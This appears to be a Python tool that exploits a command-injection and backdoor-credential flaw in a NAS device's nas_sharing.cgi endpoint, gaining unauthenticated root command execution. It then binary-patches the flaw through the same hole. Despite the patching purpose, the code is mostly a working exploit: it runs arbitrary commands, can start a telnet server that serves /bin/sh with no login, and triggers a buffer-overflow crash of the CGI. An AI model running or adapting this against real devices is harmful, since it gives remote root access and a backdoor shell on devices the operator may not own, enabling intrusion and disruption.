import argparse
import base64
import logging
import requests
import urllib.parse


logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
fmt = logging.Formatter(fmt="%(asctime)s [%(levelname)9s] %(message)s")
handler = logging.StreamHandler()
handler.setFormatter(fmt=fmt)
logger.addHandler(handler)
logging.getLogger().setLevel(logging.DEBUG)

regular_response = """<?xml version="1.0" encoding="UTF-8"?>
<config><nas_sharing><auth_state>1</auth_state></nas_sharing></config>
"""

FORBIDDEN_CHARS = "$`#%^&()+{};[]\\= "


class Dinkleberry:

    host: str

    def __init__(self, host):
        self.host = host

    def _perform_rce(self, command: list[str]) -> requests.Response:

        if any(forbidden in cmd for cmd in command for forbidden in FORBIDDEN_CHARS):
            logger.warning(
                "Forbidden character detected - will be escaped with a \\ character"
            )

        logger.debug(f"Sending {" ".join(command)}")
        params = {
            "user": "messagebus",
            "passwd": "",
            # "dbg": 1,
            "cmd": 15,
            "system": base64.b64encode("\t".join(command).encode()),
        }
        if len(params["system"]) > 4096:
            raise ValueError("Command too long")
        headers = {"Accept-Encoding": "identity"}
        params_str = urllib.parse.urlencode(params, safe="=/+")
        target_url = f"http://{self.host}/cgi-bin/nas_sharing.cgi"
        response = requests.get(target_url, params=params_str, headers=headers)
        response.raise_for_status()
        return response

    def run(self, command: list[str]) -> str:
        response = self._perform_rce(command=command)
        if response.text.endswith(regular_response):
            trimmed = response.text[: -len(regular_response)]
            logger.debug(trimmed)
            return trimmed
        raise RuntimeError("Error running command")

    def is_vulnerable(self) -> bool:
        response = self._perform_rce(command=["id"])
        return response.status_code == 200 and "root" in response.text

    def patch(self) -> None:
        patch_command = [
            "cp",
            "/usr/local/modules/cgi/nas_sharing.cgi",
            "/usr/local/config/nas_sharing_patched.cgi",
        ]
        self._perform_rce(command=patch_command)
        patch_command = [
            "printf",
            "'\x00\xf0\x20\xe3\x00\xf0\x20\xe3'",  # problematic due to '
            "|",
            "dd",
            "of=/usr/local/config/nas_sharing_patched.cgi",
            "bs=1",
            "seek=29984",
            "count=8",
            "conv=notrunk",
        ]
        self._perform_rce(command=patch_command)
        patch_command = [
            "ln",
            "-s",
            "/usr/local/config/nas_sharing_patched.cgi",
            "/var/www/cgi-bin/nas_sharing.cgi",
        ]
        self._perform_rce(command=patch_command)

    def start_telnet(self):
        logger.warning("Telnet is obviously very insecure. Kill it when you're done.")
        self._perform_rce(["utelnetd", "-p", "23", "-l", "/bin/sh", "-d"])

    def kill_telnet(self):
        self._perform_rce(["killall", "utelnetd"])

    def buffer_overflow(self):
        response = self._perform_rce([";" * 2047])
        logger.debug(response.status_code)  # 200
        logger.debug(response.text)  # Normal response
        response = self._perform_rce([";" * 2100])
        logger.debug(response.status_code)  # 200
        logger.debug(response.text)  # No response because the CGI crashed


def main():
    parser = argparse.ArgumentParser(prog="dinkleberry")
    parser.add_argument("target", type=str, help="Target NAS to patch")
    parser.add_argument(
        "--telnet", action="store_true", default=False, help="Start telnet server"
    )
    parser.add_argument(
        "--kill-telnet", action="store_true", default=False, help="Stop telnet server"
    )
    args = parser.parse_args()

    d = Dinkleberry(host=args.target)

    if not d.is_vulnerable():
        logger.info("Device not vulnerable")

    if args.telnet:
        d.start_telnet()
        exit(0)

    if args.kill_telnet:
        d.kill_telnet()
        exit(0)

    logger.info("Patching vulnerability...")
    d.patch()
    if d.is_vulnerable():
        logger.info("Not successful :(")
        exit(1)
    else:
        logger.info("Successfully patched NAS")
        exit(0)


if __name__ == "__main__":
    main()
